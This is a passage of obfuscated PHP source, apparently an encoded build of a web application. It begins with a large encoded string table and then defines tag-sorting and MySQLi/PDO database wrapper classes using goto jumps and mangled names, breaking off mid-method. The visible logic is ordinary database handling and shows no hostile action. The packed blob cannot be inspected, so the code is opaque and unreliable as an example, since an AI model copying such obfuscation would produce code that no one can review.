•Ôq÷A4zJøT¥')."\302\7\237\33\13\342\247\173\330\320\242\67\176\130\114\27\14\311\224\44\35\72\364\106\116\305\265\4\3\321\43\72\375\225\322\161\147\301\144\257\305\253\247\15\1\114\171\153\72\372\242\245\62\326\14\72\366"."\162\350\125\270\323\21\224\205\327\231\73\103\5\40\260\317\101\236\154\170\47\160\337\165\370\1\40\352\303\325\223\114\332\301\21\215\1\313\375\337\271\230\367\131\342\15\37\154\100\303\376\140\157\165\15\224\250"."\x2c\xfe\x1\x7a\xc6\x99\xbf\x72\x30\x6a\x68\xcd\xee\x91\xc7\xf8\xa0\xb0\x8\x4d\x65\x34\x69\x58\x22\xd8\x7b\xa4\x25\x37\x3\x31\xac\x51\x25\xce\x58\x34\x61\x9a\xdd\x7d\x6e\x6\x6a\xa7\xdd\xc4\x9e\xa7\x21\x46\xd1\xf0\x71\x0\xb1"."\320\140\230\224\207\255\235\10\337\154\141\16\65\351\366\147\64\247\46\244\100\260\13\356\275\275\376\360\142\51\255\230\22\27\172\320\45\205\165\226\43\347\16\350\120\217\22\171\234\252\260\240\240\23\35\200\70"."\55\56\205\330\216\104\364\264\11\13\52\53\30\217\272\130\34\74\75\161\46\231\221\254\15\227\12\11\145\71\304\357\13\171\340\216\306\312\27\20\230\354\165\254\345\214\53\360\36\240\362\267\213\25\276\113\360"."\263\374\354\104\310\240\346\113\252\241\362\51\117\273\152\134\304\57\353\113\324\24\1\1\72\34\343\226\343\254\133\331\167\312\54\232\171\34\343\220\207\304\4\333\131\74\44\342\343\172\302\152\0\375\26\200\245".strrev('yQ7uÌ‹J’j2­ÄşI«a•ÅdÈî®şB9:’•eì$|+Ëj›…DƒiN½rã¨ºë–')."\130\153\307\122\47\250\230\300\171\207\337\353\100\357\237\161\277\261\50\10\344\111\7\74\336\102\25\160\360\53\372\30\272\44\46\323\112\325\220\1\53\261\333\304\60\177\60\206\204\122\22\165\333\105\344\24\62".base64_decode('BkXWRYJbIzc9cmROv+HJs4862XGZNATB3PIUZqSPgdHK4qjdDW7GIiOX44I0iZvWMwSpVapHHhqw')."\76\15\272\337\231\117\35\376\303\306\143\163\147\364\40\232\57\127\60\55\246\320\335\252\301\37\356\100\142\2\337\16\101\331\113\313\215\227\1\54\266\366\1\132\15\346\71\25\232\221\344\123\232\330\62\304\262"."\174\200\65\70\120\10\233\130\73\340\111\265\331\207\210\40\240\224\24\153\366\111\313\62\354\274\236\361\151\13\143\104\21\201\216\220\375\251\340\370\236\376\102\27\67\206\110\217\202\40\102\254\226\242\344\227\362"."\100\173\321\140\154\72\210\126\10\45\100\30\55\113\354\121\270\32\32\251\253\203\263\165\174\33\15\100\330\227\20\10\160\212\246\151\302\360\143\165\364\20\366\323\350\302\216\57\250\334\221\126\231\63\126\13\32"."\41\167\260\105\230\324\105\13\131\337\260\273\226\142\336\217\335\377\133\240\272\40\136\213\76\174\261\143\32\356\226\235\240\203\257\365\141\117\64\144\102\212\105\122\157\100\350\7\12\340\200\136\231\31\263\273\334"."\173\20\364\43\311\304\7\356\167\225\270\162\162\211\362\57\101\220\346\113\164\276\30\246\205\216\240\310\1\244\21\7\12\40\342\24\205\244\312\120\13\161\42\24\66\140\350\235\106\66\166\260\107\311\217\127\111".base64_decode('MfERxvk+Q3zghDYBE0bZN9Av3EQ7cBsdjFxUI4DUC40wFrAc3LO+A5/NIyMWzhx4d1CyTyv8g7CG')."\x11\xf1\xe3\x16\x49\xce\x2e\xc4\xb1\x5e\xb2\x65\x8\xd9\x7b\x32\xa2\x95\xfb\x55\xe0\xee\x92\xf2\xc5\x1c\xf7\x4b\x5\x22\x56\x1\x16\x8b\xf6\x64\xa8\x7f\xac\xb9\x45\x3d\xeb\x40\xaa\xb1\xe\xfa\xec\x9f\x3\x3f\xf4\xea\xb0\x14\x81"."\x2a\x14\x33\x85\x6\x33\x69\xca\x36\x5c\x65\x1f\xfb\x2f\x4a\x27\x5e\x7a\x91\x40\xb\x44\x3\xec\xa8\x2\x27\xb5\xa0\x8b\x8d\xca\x68\xaa\x85\x2e\xc1\xee\x91\x1f\x19\xe3\x97\x40\xb\x76\x46\xb9\x2c\x97\x6c\x6c\x9a\x39\x57\xdc\x2f".base64_decode('8mHk/m/IUX4T/qFHY4wwJCudSfT5UXFmo0Srs2HyYKzABW3867+aDp5K4ibOJJxgsZKFLqj0lf97')."\x3d\x70\x9c\x8a\x94\xd0\x4f\x2b\x8f\x59\x3d\xa8\x91\x3d\x22\x4f\x16\x84\x46\x51\xbc\x5\xa3\xe1\x61\xf3\xcb\xcc\x4\xf3\xd9\x71\x7b\x93\xf1\xfb\x9a\xff\x7d\xa5\xa9\x94\x27\x5b\xfd\x67\xa1\x54\xbe\x60\x42\xf6\x41\xbf\x4c\x8f\x75"."\x85\x65\xf\x5\xf1\x9a\x2b\x8c\xad\x70\xb8\xa1\x98\x41\x68\x4e\x4f\x46\x5e\xd8\x53\x80\x14\xb\x9a\xb0\x4e\x82\x18\x5b\xfd\xf9\xbb\x5d\xb0\x62\xb4\x26\x93\x6c\x2\xe8\xdc\xe5\xd5\x41\xaf\x9\x70\xaf\x1d\x88\x4c\x2d\x24\x2b\xbc"."\x6c\x2b\x3a\xe7\x47\x5\x45\x4\xcf\x86\xe5\x45\xa3\x5d\x28\xa9\x24\xa1\x59\x74\x5d\x8f\x5c\xdb\x79\xba\xd8\x7b\xb\xf0\x2a\x93\x57\x1\xc6\x38\xa3\x32\x35\x9e\x62\xa\x2f\x1\x40\xd6\x16\xa4\xe7\x76\x60\x1b\x6b\x11\x6a\x41\x9c".base64_decode('2z0JMy9pA4pSiDCTwQxTBcGUSGxcBEINFTwSkY0y7ykPIeukQ3zPF0QZ1ZE1hcx95AoZf1ZYQfhi').base64_decode('wUO91DQARoQjISRIssSMKGPCp6ZwiIpVrBaIz1WaALgSkPrIMoaClLdC3WFksgvzkN6z8grUoB9Z')."\13\141\161\314\25\267\260\260\212\274\173\17\61\225\220\221\303\22\43\21\56\321\41\265\153\341\12\11\305\231\123\125\372\110\30\175\73\114\146\376\140\240\43\35\266\215\302\107\114\4\45\233\345\353\204\370\10"."\x4c\x36\x2e\xeb\x2e\x40\x4e\xc3\x26\x75\x3c\x56\x29\x22\xbe\x75\x50\x41\xfa\xa7\x12\x8\x6f\x40\x5e\x4d\xc\x57\x70\x34\x4\x3b\x1b\xaa\xe4\x8\x2c\x5a\x58\xd8\xca\xd0\x38\xd7\x0\xeb\x1f\x53\xa5\xa3\x21\x24\x2a\x43\x91\x88\xbc"."\x57\x6e\x79\x79\x23\xc8\xae\x98\x6b\x88\x93\xba\xa1\x85\x74\xf6\xc3\x29\x47\xcf\xae\xc4\x89\x6f\x1\x95\xb1\x8b\x88\x65\xad\xb0\x0\xc5\xee\x21\x44\x0\x5d\xdd\x53\x7a\xb0\xe4\x80\x8e\x89\xda\x5\x99\x1b\x23\x19\x62\xdf\x5a\x1e"."\17\51\367\43\216\374\26\133\236\363\216\25\212\46\165\60\104\112\302\42\265\130\252\350\272\252\274\2\154\16\213\131\370\212\203\343\61\320\126\353\176\130\54\32\337\54\303\75\137\10\156\317\134\266\342\331\244"."\253\70\321\124\3\237\42\212\133\27\20\22\53\112\147\152\237\256\241\106\133\241\154\31\21\54\234\4\355\243\260\235\327\231\232\245\233\201\274\57\234\360\343\207\72\361\153\350\360\225\101\300\361\244\160\177\117".base64_decode('NXJ7DgEwgB97O47IM8dJUyThP/zkXzVMhoUcJ/l7+aPLNRJ/qk58ch0egXVqjJSsrzZAx8rWedNW')."\11\55\241\351\206\200\46\274\160\165\54\364\77\217\203\75\152\236\76\26\102\246\3\315\116\272\36\307\52\225\17\106\72\154\132\306\204\77\71\157\177\152\36\355\20\361\246\317\262\367\43\132\76\42\110\70\245"."\x82\xaa\xec\x56\x17\xb2\x28\x11\x81\xe9\x6b\x9e\xa4\x4\xe1\xa8\xdd\x7a\xe9\xc1\xde\x1a\x2f\xe3\x75\x45\x35\x20\x24\xa3\x5c\xf4\xd1\x38\xf0\xb\x1f\x74\xf0\x73\x5f\xf\x28\x19\x1f\xe\x7a\x4a\x32\xd3\x80\xb1\xe7\xea\xb7\x8\xd0"."\302\25\111\2\121\40\337\345\240\214\161\120\113\364\217\247\240\332\163\230\31\125\117\266\253\371\244\35\277\230\217\63\50\107\7\203\321\136\11\14\204\57\316\356\155\160\141\145\342\14\127\56\361\43\164\56\266".base64_decode('JpOdcqkCKrPMZlAAYahIWhLeneG+h5VR8esEL1W+LkHEcih/l8beLjRvGJzcWuQFD26E3DgI4SSY')."\163\77\134\24\364\344\354\202\216\262\271\327\77\134\107\266\373\344\237\264\76\237\303\320\230\44\7\160\220\216\273\323\2\265\271\77\206\7\161\164\205\266\45\221\255\257\120\174\305\35\262\205\24\2\102\161\342"."\305\311\244\31\302\225\77\302\351\325\332\305\141\333\165\215\215\205\162\144\272\70\152\226\1\21\30\54\153\54\301\14\211\211\226\52\332\207\33\355\102\70\255\142\140\16\35\217\341\64\217\65\11\343\53\266\26"."\211\31\354\255\305\71\364\262\76\43\171\52\177\332\376\1\332\145\366\153\113\136\210\260\11\52\273\123\215\150\25\362\340\32\125\314\206\223\140\116\56\375\131\362\32\243\252\231\310\124\314\213\223\140\336\262\144"."\x9a\x59\xd8\xcf\xb\xf9\x4c\xb9\x68\x4c\xd2\xbc\xf2\xce\x43\x53\xcb\xd6\x75\xa4\xc1\xdc\x6f\xb9\x80\x3a\x59\x7f\x56\x44\x2e\xff\x1c\x21\x1e\x3b\x36\xda\x87\x57\xae\x45\xc5\xf3\x84\xc9\x6a\x51\x11\x79\xd2\x5a\x70\x6c\xdb\xf5\x69"."\45\36\111\123\52\160\105\176\333\131\316\177\171\132\205\273\127\134\46\134\234\103\26\125\304\262\144\361\42\267\362\125\157\250\342\54\66\254\167\260\66\270\330\61\124\251\144\313\251\247\154\173\350\174\177\237\104"."\3\42\330\302\265\213\371\341\74\365\326\4\276\300\275\40\102\213\114\217\156\357\77\52\3\332\374\12\123\362\314\27\5\137\266\25\35\23\73\340\336\272\174\363\232\245\276\274\104\267\315\170\323\243\231\152\102"."\120\1\201\100\321\363\60\116\247\37\311\362\123\70\42\100\340\233\75\257\250\321\374\341\335\247\154\273\377\306\155\33\256\331\166\336\251\133\316\277\324\261\365\314\365\133\257\74\175\353\225\147\157\71\343\232\55".base64_decode('l92EE7Zetfajy86bJ209/Rcw8eLTPnjgbvzvluvv+3DDw9se2oBRttx234e3rd924U1b192z9ZJf')._kodDe('KLNj0144x3ad4XB30tuXqDywOBWBUPRd0g2ZjtYyJxIM5760LTeiN0DI+gQ0fK2yBNkUptqRnD7GFA==').strrev('º?*,ú\'ÎÜEN'."\n".'Ã£nÚä‚…¾ >hï\'D!ÂúOâh+„x>D¼H˜Fú@ee&™®Ûô¬')."\357\54\332\356\251\70\0\154\200\343\332\30\241\65\364\170\17\257\17\74\172\47\335\142\27\41\371\373\14\204\330\305\13\165\244\305\146\270\161\212\233\150\274\73\121\31\116\362\242\44\323\170\43\331\223\150\376".base64_decode('Mi+eP1YCOY3kReBnzNGJVm8wEvMt9Ycj4bKkPk84PBAMebHWbFkyyiVoL5Ql9XUHeydL8/V4/IGy')."\x34\xa8\xcd\x0\x75\x79\xe9\xa3\xa7\x38\xc9\xdf\x87\x6a\xe9\x9\x4\xa8\xea\x5c\x79\x2d\xfc\x1d\x8b\x79\x4d\xd0\x25\x1e\x3f\x72\x2e\x64\x34\x7a\x82\x6b\x53\xeb\xa1\x27\xf4\x61\x99\xce\x46\xf1\x81\xf\x25\xc7\x4e\xd4\x84\x22\xac"."\247\35\342\60\33\364\41\136\26\50\224\355\154\4\1\4\152\34\364\222\302\102\324\101\45\174\5\236\161\26\46\145\243\6\211\252\113\374\232\322\145\271\316\24\340\150\262\40\376\46\20\241\270\274\43\0\121"."\265\265\135\47\331\72\260\313\166\60\154\271\220\104\20\336\41\260\336\213\250\203\212\225\132\134\270\243\302\54\320\302\374\104\235\21\34\266\44\3\336\22\321\42\162\232\360\22\50\360\360\130\373\270\30\26\217"."\145\332\30\53\61\345\64\325\12\260\163\171\341\32\34\366\322\377\7\174\67\342\145\347\305\0\0", 10, -8))); goto báñ»Åœßå; EÂé»’†Úƒ: class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\145\162\56\164\x61\x67\114\x69\x73\164"; public $modelType = "\125\x73\145\x72\117\x70\x74\x69\157\156"; public $field = array("\x6e\x61\155\145", "\163\164\171\154\145", "\x73\x6f\x72\164"); public function listData($cÅµ›½°ƒ = false, $F´‰ÚîÕ¦é = "\163\157\162\x74", $A½ù™¦Áğ¡ = false) { return parent::listData($cÅµ›½°ƒ, $F´‰ÚîÕ¦é, $A½ù™¦Áğ¡); } public function remove($B±ìçØƒ«İ) { return parent::remove($B±ìçØƒ«İ); } public function add($c­ç·‹½‡Š, $F¾ğ†„êï = "\154\141\142\145\x6c\x2d\x67\162\x65\x79\x2d\x6e\x6f\x72\x6d\x61\x6c") { $Bí‚¡¶§ËÈ =& $_SERVER[¶ªÕß‚ØÁŸ]; if ($this->findByName($c­ç·‹½‡Š)) { return !1; } $eĞƒ£æ… = array($Bí‚¡¶§ËÈ[394] => $c­ç·‹½‡Š, $Bí‚¡¶§ËÈ[445] => $F¾ğ†„êï, $Bí‚¡¶§ËÈ[2111] => $this->getSort($Bí‚¡¶§ËÈ[255]) + 1); return parent::insert($eĞƒ£æ…); } public function update($cÁƒ¥êå¹, $cèÅçó·í«) { $D¼·ïÇÏàÇ =& $_SERVER[¶ªÕß‚ØÁŸ]; $dµÎ¡—ç½§ = $this->listData($cÁƒ¥êå¹); $C•Àé‰Ê = $this->findByName($cèÅçó·í«[$D¼·ïÇÏàÇ[28]]); if (!$dµÎ¡—ç½§ || $C•Àé‰Ê && $C•Àé‰Ê[$D¼·ïÇÏàÇ[375]] != $dµÎ¡—ç½§[$D¼·ïÇÏàÇ[375]]) { return !1; } return parent::update($cÁƒ¥êå¹, $cèÅçó·í«); } public function moveTop($a·‘áÈ‚) { $EÑ‘÷°íœ´ =& $_SERVER[¶ªÕß‚ØÁŸ]; $Cîèİ‘µ¶Œ = parent::listData(); $Bé‰¥¹…ñÂ = $this->getSort($EÑ‘÷°íœ´[254]); foreach ($Cîèİ‘µ¶Œ as &$A–ŸõÎÆô’) { if ($A–ŸõÎÆô’[$EÑ‘÷°íœ´[375]] == $a·‘áÈ‚) { $A–ŸõÎÆô’[$EÑ‘÷°íœ´[2128]] = $Bé‰¥¹…ñÂ; continue; } $A–ŸõÎÆô’[$EÑ‘÷°íœ´[2128]] += 1; } return parent::resetData($Cîèİ‘µ¶Œ); } public function moveBottom($AŞ‘ÕÔ¸Á) { $b¶©ªÔ¶ =& $_SERVER[¶ªÕß‚ØÁŸ]; $còÛ±¿¨Íà = $this->getSort($b¶©ªÔ¶[255]) + 1; return parent::update($AŞ‘ÕÔ¸Á, array($b¶©ªÔ¶[2128] => $còÛ±¿¨Íà)); } public function resetSort($a¥„—á†±Õ) { goto A‚¤Ö‹´ïò; A‚¤Ö‹´ïò: $Cæ˜íÌìŠ¨ =& $_SERVER[¶ªÕß‚ØÁŸ]; $C¦¾–ôº‡İ = array(); $a¥„—á†±Õ = is_array($a¥„—á†±Õ) ? $a¥„—á†±Õ : array(); goto Aë¸¸†ŸÛ; Aë¸¸†ŸÛ: for ($eİÁ¢á‰à§ = 0; $eİÁ¢á‰à§ < count($a¥„—á†±Õ); $eİÁ¢á‰à§++) { $C¦¾–ôº‡İ[$a¥„—á†±Õ[$eİÁ¢á‰à§] . $Cæ˜íÌìŠ¨[33]] = $eİÁ¢á‰à§ + 1; } $fî¼äÅŸ–ë = parent::listData(); foreach ($fî¼äÅŸ–ë as &$aáÒ ‘Í¯) { $fˆîàÁéÃŸ = $C¦¾–ôº‡İ[$aáÒ ‘Í¯[$Cæ˜íÌìŠ¨[375]]]; $aáÒ ‘Í¯[$Cæ˜íÌìŠ¨[2128]] = $fˆîàÁéÃŸ ? $fˆîàÁéÃŸ : $aáÒ ‘Í¯[$Cæ˜íÌìŠ¨[2128]]; } goto F»¼“ŞŸÙâ; F»¼“ŞŸÙâ: return parent::resetData($fî¼äÅŸ–ë); goto dğºõÓŞ; dğºõÓŞ: } private function getSort($B‡óØƒ·Çõ) { $C°‹ß„Êø™ =& $_SERVER[¶ªÕß‚ØÁŸ]; $AáÖÈ´ÊëŒ = parent::listData(); $BŞ’ÇÕÏ½³ = array_to_keyvalue($AáÖÈ´ÊëŒ, $C°‹ß„Êø™[33], $C°‹ß„Êø™[2128]); if (!$BŞ’ÇÕÏ½³) { $BŞ’ÇÕÏ½³ = array(0); } $A¿ä…Ê’Õ‰ = $B‡óØƒ·Çõ == $C°‹ß„Êø™[255] ? max($BŞ’ÇÕÏ½³) : min($BŞ’ÇÕÏ½³); return intval($A¿ä…Ê’Õ‰); } } goto cÅëÉï­ò; Fñ††»©½: class DbMysqli extends Db { public function __construct($bñÅ‡î“­ = '') { $cæ›ñÙº‡÷ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!extension_loaded($cæ›ñÙº‡÷[740])) { think_exception(think_lang($cæ›ñÙº‡÷[10]) . $cæ›ñÙº‡÷[831]); } if (!empty($bñÅ‡î“­)) { $this->config = $bñÅ‡î“­; if (empty($this->config[$cæ›ñÙº‡÷[13]])) { $this->config[$cæ›ñÙº‡÷[13]] = $cæ›ñÙº‡÷[33]; } } } public function connect($bÔ»×…‹’ = '', $Eî««‚£… = 0) { $f•áç¹“¤ö =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!isset($this->linkID[$Eî««‚£…])) { goto a®Ã’ñ£¤ô; B’ª¹İÚ¡Æ: $A‘…´é¡ñ¨ = $this->linkID[$Eî««‚£…]->server_version; $this->linkID[$Eî««‚£…]->query($f•áç¹“¤ö[809] . think_config($f•áç¹“¤ö[810]) . $f•áç¹“¤ö[55]); if ($A‘…´é¡ñ¨ > $f•áç¹“¤ö[811]) { $this->linkID[$Eî««‚£…]->query($f•áç¹“¤ö[812]); } goto BÒˆŠƒ­“; a®Ã’ñ£¤ô: if (empty($bÔ»×…‹’)) { $bÔ»×…‹’ = $this->config; } $this->linkID[$Eî««‚£…] = new mysqli($bÔ»×…‹’[$f•áç¹“¤ö[805]], $bÔ»×…‹’[$f•áç¹“¤ö[807]], $bÔ»×…‹’[$f•áç¹“¤ö[808]], $bÔ»×…‹’[$f•áç¹“¤ö[17]], $bÔ»×…‹’[$f•áç¹“¤ö[806]] ? intval($bÔ»×…‹’[$f•áç¹“¤ö[806]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto B’ª¹İÚ¡Æ; BÒˆŠƒ­“: $this->connected = !0; if (1 != think_config($f•áç¹“¤ö[18])) { unset($this->config); } goto F¸¸Å¿¡¬; F¸¸Å¿¡¬: } return $this->linkID[$Eî««‚£…]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($B—ÂîæÍ½) { goto aåè…÷ÁØ»; FïÑÙ—é¸: think_status($EÚŠÂŠ¼†„[20]); $this->queryID = $this->_linkID->query($B—ÂîæÍ½); if ($this->_linkID->more_results()) { while (($E°›ˆÅ† È = $this->_linkID->next_result()) != NULL) { $E°›ˆÅ† È->free_result(); } } goto AˆÜÏô¯¥Õ; aåè…÷ÁØ»: $EÚŠÂŠ¼†„ =& $_SERVER[¶ªÕß‚ØÁŸ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto B¯íöâ…Øå; AˆÜÏô¯¥Õ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto b‡‚¡Î•Ûã; B¯íöâ…Øå: $this->queryStr = $B—ÂîæÍ½; if ($this->queryID) { $this->free(); } think_action_status($EÚŠÂŠ¼†„[19], 1); goto FïÑÙ—é¸; b‡‚¡Î•Ûã: } public function execute($aÍë¿ÅºİÃ) { goto DƒÖ¢õôÅ‘; eõó‚«­Ë: if (!1 === $bŒÌ”¨œÇº) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto Aï¼‘˜ˆ…; DƒÖ¢õôÅ‘: $eâë×ßçí˜ =& $_SERVER[¶ªÕß‚ØÁŸ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto aåÊŒá•ˆõ; aåÊŒá•ˆõ: $this->queryStr = $aÍë¿ÅºİÃ; if ($this->queryID) { $this->free(); } think_action_status($eâë×ßçí˜[21], 1); goto bÄ••Û‚ìé; bÄ••Û‚ìé: think_status($eâë×ßçí˜[20]); $bŒÌ”¨œÇº = $this->_linkID->query($aÍë¿ÅºİÃ); $this->debug(); goto eõó‚«­Ë; Aï¼‘˜ˆ…: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $d»†ùğ“Š„ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$d»†ùğ“Š„) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $f¹ÇŒà¹™é = $this->_linkID->rollback(); $this->transTimes = 0; if (!$f¹ÇŒà¹™é) { $this->error(); return !1; } } return !0; } private function getAll() { $eªĞÈ…œ±È = array(); if ($this->numRows > 0) { for ($cÀÉĞ·”‡ = 0; $cÀÉĞ·”‡ < $this->numRows; $cÀÉĞ·”‡++) { $eªĞÈ…œ±È[$cÀÉĞ·”‡] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $eªĞÈ…œ±È; } public function getFields($e·ãÑ‹ÁÖ³) { $cöÜ¬•¼“Ø =& $_SERVER[¶ªÕß‚ØÁŸ]; $AÊ¡­ƒ·£ = $this->query($cöÜ¬•¼“Ø[816] . $this->parseKey($e·ãÑ‹ÁÖ³)); $BäàÃâŞÛˆ = array(); if ($AÊ¡­ƒ·£) { foreach ($AÊ¡­ƒ·£ as $A­¨ÁßÜÌ¹ => $D”À˜Öï–¿) { $BäàÃâŞÛˆ[$D”À˜Öï–¿[$cöÜ¬•¼“Ø[27]]] = array($cöÜ¬•¼“Ø[28] => $D”À˜Öï–¿[$cöÜ¬•¼“Ø[27]], $cöÜ¬•¼“Ø[29] => $D”À˜Öï–¿[$cöÜ¬•¼“Ø[30]], $cöÜ¬•¼“Ø[31] => (bool) ($D”À˜Öï–¿[$cöÜ¬•¼“Ø[32]] === $cöÜ¬•¼“Ø[33]), $cöÜ¬•¼“Ø[34] => $D”À˜Öï–¿[$cöÜ¬•¼“Ø[35]], $cöÜ¬•¼“Ø[36] => strtolower($D”À˜Öï–¿[$cöÜ¬•¼“Ø[37]]) == $cöÜ¬•¼“Ø[38], $cöÜ¬•¼“Ø[39] => strtolower($D”À˜Öï–¿[$cöÜ¬•¼“Ø[40]]) == $cöÜ¬•¼“Ø[41]); } } return $BäàÃâŞÛˆ; } public function getTables($D¸¯…øä¿™ = '') { $dôãš…§µ’ =& $_SERVER[¶ªÕß‚ØÁŸ]; $fÕŒˆîëß = !empty($D¸¯…øä¿™) ? $dôãš…§µ’[818] . $D¸¯…øä¿™ : $dôãš…§µ’[819]; $f«Û‚†Ê = $this->query($fÕŒˆîëß); $C„Å­©¼¤ù = array(); if ($f«Û‚†Ê) { foreach ($f«Û‚†Ê as $F¼”œáöÁ› => $e«¯ªÏéªŠ) { $C„Å­©¼¤ù[$F¼”œáöÁ›] = current($e«¯ªÏéªŠ); } } return $C„Å­©¼¤ù; } public function replace($BÕáÉ‘Ó¥, $cÏ¨¥‹ìÏ = array()) { $cÆÉ¸Ñ‰ïÖ =& $_SERVER[¶ªÕß‚ØÁŸ]; foreach ($BÕáÉ‘Ó¥ as $EÆî‘¨„ëŸ => $bø¸İ±ÜŞó) { $A²ƒÂíå = $this->parseValue($bø¸İ±ÜŞó); if (is_scalar($A²ƒÂíå)) { $A ’‡³©š—[] = $A²ƒÂíå; $dº÷öÈÓÀŸ[] = $this->parseKey($EÆî‘¨„ëŸ); } } $cÛƒé…¯öç = $cÆÉ¸Ñ‰ïÖ[820] . $this->parseTable($cÏ¨¥‹ìÏ[$cÆÉ¸Ñ‰ïÖ[276]]) . $cÆÉ¸Ñ‰ïÖ[821] . implode($cÆÉ¸Ñ‰ïÖ[47], $dº÷öÈÓÀŸ) . $cÆÉ¸Ñ‰ïÖ[822] . implode($cÆÉ¸Ñ‰ïÖ[47], $A ’‡³©š—) . $cÆÉ¸Ñ‰ïÖ[823]; return $this->execute($cÛƒé…¯öç); } public function insertAll($aÏŠ‡ô½ÎÖ, $BÙéÑØÒî´ = array(), $Fá‰´§ó× = false) { goto d±ÃÏèà‘ˆ; DÃ«ÙŒã÷: $F–øÌØğ = ($Fá‰´§ó× ? $e¹Ø²«øæ[825] : $e¹Ø²«øæ[826]) . $e¹Ø²«øæ[827] . $this->parseTable($BÙéÑØÒî´[$e¹Ø²«øæ[276]]) . $e¹Ø²«øæ[821] . implode($e¹Ø²«øæ[47], $e¶®÷‡éõ) . $e¹Ø²«øæ[828] . implode($e¹Ø²«øæ[47], $cÀ‡ Ğêï—); return $this->execute($F–øÌØğ); goto f‚ÕÖÂƒíİ; aæ ö¾¶‰: $cÀ‡ Ğêï— = array(); foreach ($aÏŠ‡ô½ÎÖ as $bâóáİ¢†) { $c¤¶Úëâï• = array(); foreach ($bâóáİ¢† as $cõ¿½‚‹ => $BÚ‚‰„÷Ñë) { $BÚ‚‰„÷Ñë = $this->parseValue($BÚ‚‰„÷Ñë); if (is_scalar($BÚ‚‰„÷Ñë)) { $c¤¶Úëâï•[] = $BÚ‚‰„÷Ñë; } } $cÀ‡ Ğêï—[] = $e¹Ø²«øæ[257] . implode($e¹Ø²«øæ[47], $c¤¶Úëâï•) . $e¹Ø²«øæ[823]; } array_walk($e¶®÷‡éõ, array($this, $e¹Ø²«øæ[824])); goto DÃ«ÙŒã÷; d±ÃÏèà‘ˆ: $e¹Ø²«øæ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!is_array($aÏŠ‡ô½ÎÖ[0])) { return !1; } $e¶®÷‡éõ = array_keys($aÏŠ‡ô½ÎÖ[0]); goto aæ ö¾¶‰; f‚ÕÖÂƒíİ: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $A‹Ÿø”Ï­ƒ =& $_SERVER[¶ªÕß‚ØÁŸ]; $this->error = $this->_linkID->errno . $A‹Ÿø”Ï­ƒ[4] . $this->_linkID->error; if ($A‹Ÿø”Ï­ƒ[33] != $this->queryStr) { $this->error .= LNG($A‹Ÿø”Ï­ƒ[45]) . $this->queryStr; } think_trace($this->error, $A‹Ÿø”Ï­ƒ[33], $A‹Ÿø”Ï­ƒ[46]); return $this->error; } public function escapeString($D†¹¹÷ˆëŞ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($D†¹¹÷ˆëŞ); } else { return addslashes($D†¹¹÷ˆëŞ); } } public function parseKey(&$d”ÊÑæ½Ô‘, $D·îÒˆ…Ç = true) { $FíÍª—¦ÅÊ =& $_SERVER[¶ªÕß‚ØÁŸ]; if ($D·îÒˆ…Ç) { $d”ÊÑæ½Ô‘ = $this->parseKeyCheck($d”ÊÑæ½Ô‘); } if ($d”ÊÑæ½Ô‘ != $FíÍª—¦ÅÊ[186] && !preg_match($FíÍª—¦ÅÊ[829], $d”ÊÑæ½Ô‘)) { $d”ÊÑæ½Ô‘ = $FíÍª—¦ÅÊ[830] . trim($d”ÊÑæ½Ô‘, $FíÍª—¦ÅÊ[830]) . $FíÍª—¦ÅÊ[830]; } return $d”ÊÑæ½Ô‘; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($FôÍ×Ñéå¹ = '') { $eÓµ‚„¢Ä =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!class_exists($eÓµ‚„¢Ä[832])) { think_exception(think_lang($eÓµ‚„¢Ä[10]) . $eÓµ‚„¢Ä[833]); } if (!empty($FôÍ×Ñéå¹)) { $this->config = $FôÍ×Ñéå¹; if (empty($this->config[$eÓµ‚„¢Ä[13]])) { $this->config[$eÓµ‚„¢Ä[13]] = array(); } } } public function connect($d¡£àöõå = '', $A¸Î¸Úä“ = 0) { $E‰™ˆò¯Óš =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!isset($this->linkID[$A¸Î¸Úä“])) { goto c¼†õ—¿è; Cæ­¨£¥ÜË: $this->dbType = $this->_getDsnType($d¡£àöõå[$E‰™ˆò¯Óš[834]]); if (in_array($this->dbType, array($E‰™ˆò¯Óš[835], $E‰™ˆò¯Óš[836], $E‰™ˆò¯Óš[837], $E‰™ˆò¯Óš[838]))) { think_exception($E‰™ˆò¯Óš[839] . $this->dbType . $E‰™ˆò¯Óš[840] . $this->dbType . $E‰™ˆò¯Óš[841]); } if (!$this->linkID[$A¸Î¸Úä“]) { think_exception($E‰™ˆò¯Óš[842]); } goto B…—Šå¬çò; c¼†õ—¿è: if (empty($d¡£àöõå)) { $d¡£àöõå = $this->config; } if ($this->pconnect) { $d¡£àöõå[$E‰™ˆò¯Óš[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$A¸Î¸Úä“] = new PDO($d¡£àöõå[$E‰™ˆò¯Óš[834]], $d¡£àöõå[$E‰™ˆò¯Óš[807]], $d¡£àöõå[$E‰™ˆò¯Óš[808]], $d¡£àöõå[$E‰™ˆò¯Óš[13]]); } catch (PDOException $dÇøİ¡ñÒ¾) { think_exception($dÇøİ¡ñÒ¾->getMessage()); } goto Cæ­¨£¥ÜË; B…—Šå¬çò: 